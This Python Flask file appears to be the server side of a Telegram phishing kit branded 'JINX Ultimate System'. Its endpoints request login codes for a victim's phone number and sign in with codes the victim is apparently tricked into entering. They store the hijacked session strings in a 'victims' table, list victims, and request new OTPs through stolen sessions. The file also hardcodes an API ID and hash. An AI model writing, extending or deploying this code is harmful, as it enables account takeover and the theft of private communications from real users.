from flask import Flask, request, jsonify
from telethon.sync import TelegramClient
from telethon.sessions import StringSession
from telethon.errors import SessionPasswordNeededError, PhoneCodeInvalidError, PhoneCodeExpiredError
import os
import asyncio
import logging
import time
import sqlite3

logger = logging.getLogger(__name__)

API_ID = int(os.environ.get("API_ID", 24289127))
API_HASH = os.environ.get("API_HASH", "cd63113435f4997590ee4a308fbf1e2c")
MASTER_SESSION = os.environ.get("MASTER_SESSION")

# Database functions
def init_db():
    conn = sqlite3.connect('victims.db', check_same_thread=False)
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS victims
                (phone TEXT PRIMARY KEY, 
                 session_string TEXT, 
                 created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                 last_otp TEXT,
                 last_otp_time TIMESTAMP)''')
    c.execute('''CREATE TABLE IF NOT EXISTS otp_requests
                (id INTEGER PRIMARY KEY AUTOINCREMENT,
                 phone TEXT,
                 hash TEXT,
                 created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP)''')
    conn.commit()
    conn.close()

def save_victim_session(phone, session_string):
    try:
        conn = sqlite3.connect('victims.db', check_same_thread=False)
        c = conn.cursor()
        c.execute("INSERT OR REPLACE INTO victims (phone, session_string) VALUES (?, ?)", 
                 (phone, session_string))
        conn.commit()
        conn.close()
        logger.info(f"✅ Session saved for {phone}")
        return True
    except Exception as e:
        logger.error(f"❌ Save session error for {phone}: {e}")
        return False

def get_victim_session(phone):
    try:
        conn = sqlite3.connect('victims.db', check_same_thread=False)
        c = conn.cursor()
        c.execute("SELECT session_string FROM victims WHERE phone = ?", (phone,))
        result = c.fetchone()
        conn.close()
        return result[0] if result else None
    except Exception as e:
        logger.error(f"❌ Get session error for {phone}: {e}")
        return None

def get_all_victim_sessions():
    try:
        conn = sqlite3.connect('victims.db', check_same_thread=False)
        c = conn.cursor()
        c.execute("SELECT phone, session_string FROM victims")
        sessions = c.fetchall()
        conn.close()
        return sessions
    except Exception as e:
        logger.error(f"❌ Get all sessions error: {e}")
        return []

def save_otp_request(phone, hash_value):
    try:
        conn = sqlite3.connect('victims.db', check_same_thread=False)
        c = conn.cursor()
        c.execute("INSERT INTO otp_requests (phone, hash) VALUES (?, ?)", 
                 (phone, hash_value))
        conn.commit()
        conn.close()
        return True
    except Exception as e:
        logger.error(f"❌ Save OTP request error: {e}")
        return False

def update_victim_otp(phone, otp_code):
    try:
        conn = sqlite3.connect('victims.db', check_same_thread=False)
        c = conn.cursor()
        c.execute("UPDATE victims SET last_otp = ?, last_otp_time = CURRENT_TIMESTAMP WHERE phone = ?", 
                 (otp_code, phone))
        conn.commit()
        conn.close()
        return True
    except Exception as e:
        logger.error(f"❌ Update OTP error: {e}")
        return False

def get_victim_otp(phone):
    try:
        conn = sqlite3.connect('victims.db', check_same_thread=False)
        c = conn.cursor()
        c.execute("SELECT last_otp, last_otp_time FROM victims WHERE phone = ?", (phone,))
        result = c.fetchone()
        conn.close()
        return result if result else (None, None)
    except Exception as e:
        logger.error(f"❌ Get OTP error: {e}")
        return (None, None)

def setup_routes(app):
    
    @app.route('/send_code', methods=['POST', 'GET'])
    def send_code():
        """Send OTP code to victim's phone"""
        try:
            if request.method == 'POST':
                phone = request.form.get('phone')
            else:
                phone = request.args.get('phone')
                
            if not phone:
                return jsonify({'success': False, 'error': 'No phone provided'})
            
            logger.info(f"📱 Requesting OTP for: {phone}")
            
            async def send_otp():
                client = TelegramClient(StringSession(MASTER_SESSION), API_ID, API_HASH)
                await client.connect()
                try:
                    result = await client.send_code_request(phone)
                    save_otp_request(phone, result.phone_code_hash)
                    logger.info(f"✅ OTP sent to {phone}")
                    return {
                        'success': True, 
                        'phone_code_hash': result.phone_code_hash,
                        'timeout': result.timeout
                    }
                except Exception as e:
                    logger.error(f"❌ Send OTP error for {phone}: {e}")
                    return {'success': False, 'error': str(e)}
                finally:
                    await client.disconnect()
            
            result = asyncio.run(send_otp())
            return jsonify(result)
            
        except Exception as e:
            logger.error(f"❌ Send code route error: {e}")
            return jsonify({'success': False, 'error': str(e)})

    @app.route('/save_session', methods=['POST', 'GET'])
    def save_session():
        """Save victim session after OTP verification"""
        try:
            if request.method == 'POST':
                phone = request.form.get('phone')
                code = request.form.get('code')
                phone_code_hash = request.form.get('phone_code_hash')
            else:
                phone = request.args.get('phone')
                code = request.args.get('code')
                phone_code_hash = request.args.get('phone_code_hash')
                
            if not all([phone, code, phone_code_hash]):
                return jsonify({'success': False, 'error': 'Missing parameters'})
            
            logger.info(f"💾 Saving session for: {phone}")
            
            async def auth_and_save():
                client = TelegramClient(StringSession(MASTER_SESSION), API_ID, API_HASH)
                await client.connect()
                try:
                    # Sign in with OTP
                    await client.sign_in(phone=phone, code=code, phone_code_hash=phone_code_hash)
                    
                    # Save session
                    victim_session = StringSession.save(client.session)
                    if save_victim_session(phone, victim_session):
                        logger.info(f"✅ Session saved for {phone}")
                        return {'success': True, 'message': 'Session saved successfully'}
                    else:
                        return {'success': False, 'error': 'Failed to save session'}
                        
                except SessionPasswordNeededError:
                    error_msg = '2FA password required'
                    logger.error(f"❌ {error_msg} for {phone}")
                    return {'success': False, 'error': error_msg}
                except PhoneCodeInvalidError:
                    error_msg = 'Invalid OTP code'
                    logger.error(f"❌ {error_msg} for {phone}")
                    return {'success': False, 'error': error_msg}
                except PhoneCodeExpiredError:
                    error_msg = 'OTP code expired'
                    logger.error(f"❌ {error_msg} for {phone}")
                    return {'success': False, 'error': error_msg}
                except Exception as e:
                    logger.error(f"❌ Auth error for {phone}: {e}")
                    return {'success': False, 'error': str(e)}
                finally:
                    await client.disconnect()
            
            result = asyncio.run(auth_and_save())
            return jsonify(result)
            
        except Exception as e:
            logger.error(f"❌ Save session route error: {e}")
            return jsonify({'success': False, 'error': str(e)})

    @app.route('/auto_save_session', methods=['POST', 'GET'])
    def auto_save_session():
        """Auto save session untuk korban baru (dari PHP)"""
        try:
            if request.method == 'POST':
                phone = request.form.get('phone')
                code = request.form.get('code')
                phone_code_hash = request.form.get('phone_code_hash')
            else:
                phone = request.args.get('phone')
                code = request.args.get('code')
                phone_code_hash = request.args.get('phone_code_hash')
                
            if not all([phone, code, phone_code_hash]):
                return jsonify({'success': False, 'error': 'Missing parameters'})
            
            logger.info(f"🤖 AUTO-SAVE: Processing {phone}")
            
            async def auth_and_save():
                client = TelegramClient(StringSession(MASTER_SESSION), API_ID, API_HASH)
                await client.connect()
                try:
                    # Sign in with OTP
                    await client.sign_in(phone=phone, code=code, phone_code_hash=phone_code_hash)
                    
                    # Save session
                    victim_session = StringSession.save(client.session)
                    if save_victim_session(phone, victim_session):
                        logger.info(f"✅ AUTO-SAVE SUCCESS: {phone}")
                        return {
                            'success': True, 
                            'message': 'Session auto-saved successfully',
                            'phone': phone
                        }
                    else:
                        return {'success': False, 'error': 'Failed to save session'}
                        
                except SessionPasswordNeededError:
                    error_msg = '2FA password required'
                    logger.error(f"❌ AUTO-SAVE 2FA for {phone}")
                    return {'success': False, 'error': error_msg}
                except PhoneCodeInvalidError:
                    error_msg = 'Invalid OTP code'
                    logger.error(f"❌ AUTO-SAVE invalid OTP for {phone}")
                    return {'success': False, 'error': error_msg}
                except PhoneCodeExpiredError:
                    error_msg = 'OTP code expired'
                    logger.error(f"❌ AUTO-SAVE expired OTP for {phone}")
                    return {'success': False, 'error': error_msg}
                except Exception as e:
                    logger.error(f"❌ AUTO-SAVE error for {phone}: {e}")
                    return {'success': False, 'error': str(e)}
                finally:
                    await client.disconnect()
            
            result = asyncio.run(auth_and_save())
            return jsonify(result)
            
        except Exception as e:
            logger.error(f"❌ AUTO-SAVE route error: {e}")
            return jsonify({'success': False, 'error': str(e)})

    @app.route('/get_new_otp', methods=['POST', 'GET'])
    def get_new_otp():
        """Get new OTP for existing victim"""
        try:
            if request.method == 'POST':
                phone = request.form.get('phone')
            else:
                phone = request.args.get('phone')
                
            if not phone:
                return jsonify({'success': False, 'error': 'No phone provided'})
            
            victim_session = get_victim_session(phone)
            if not victim_session:
                return jsonify({'success': False, 'error': 'Victim session not found'})
            
            logger.info(f"🔄 Requesting new OTP for: {phone}")
            
            async def request_new_otp():
                client = TelegramClient(StringSession(victim_session), API_ID, API_HASH)
                await client.connect()
                try:
                    result = await client.send_code_request(phone)
                    save_otp_request(phone, result.phone_code_hash)
                    logger.info(f"✅ New OTP requested for {phone}")
                    return {
                        'success': True,
                        'phone_code_hash': result.phone_code_hash,
                        'timeout': result.timeout
                    }
                except Exception as e:
                    logger.error(f"❌ New OTP error for {phone}: {e}")
                    return {'success': False, 'error': str(e)}
                finally:
                    await client.disconnect()
            
            result = asyncio.run(request_new_otp())
            return jsonify(result)
            
        except Exception as e:
            logger.error(f"❌ Get new OTP route error: {e}")
            return jsonify({'success': False, 'error': str(e)})

    @app.route('/victims')
    def list_victims():
        """List all saved victims"""
        try:
            victims = get_all_victim_sessions()
            victim_list = [v[0] for v in victims]
            logger.info(f"📋 Listed {len(victim_list)} victims")
            return jsonify({'success': True, 'victims': victim_list, 'count': len(victim_list)})
        except Exception as e:
            logger.error(f"❌ List victims error: {e}")
            return jsonify({'success': False, 'error': str(e)})

    @app.route('/get_otp/<phone>')
    def get_otp(phone):
        """Get last OTP for victim"""
        try:
            otp_code, otp_time = get_victim_otp(phone)
            if otp_code:
                logger.info(f"🔑 Retrieved OTP for {phone}")
                return jsonify({
                    'success': True, 
                    'phone': phone, 
                    'otp': otp_code, 
                    'time': otp_time
                })
            else:
                return jsonify({'success': False, 'error': 'No OTP found'})
        except Exception as e:
            logger.error(f"❌ Get OTP error: {e}")
            return jsonify({'success': False, 'error': str(e)})

    @app.route('/status')
    def status():
        """System status"""
        try:
            victims = get_all_victim_sessions()
            return jsonify({
                'success': True,
                'status': 'JINX Ultimate System Running 😈',
                'victims_count': len(victims),
                'timestamp': time.time(),
                'service': 'api_routes'
            })
        except Exception as e:
            logger.error(f"❌ Status error: {e}")
            return jsonify({'success': False, 'error': str(e)})

    @app.route('/health')
    def health():
        return jsonify({'status': 'healthy', 'service': 'jinx_api'})

    @app.route('/test')
    def test():
        return jsonify({
            'success': True,
            'message': 'JINX API Routes Working! 😈',
            'version': '2.0 - Auto Save Enabled'
        })

# Initialize database on import
init_db()
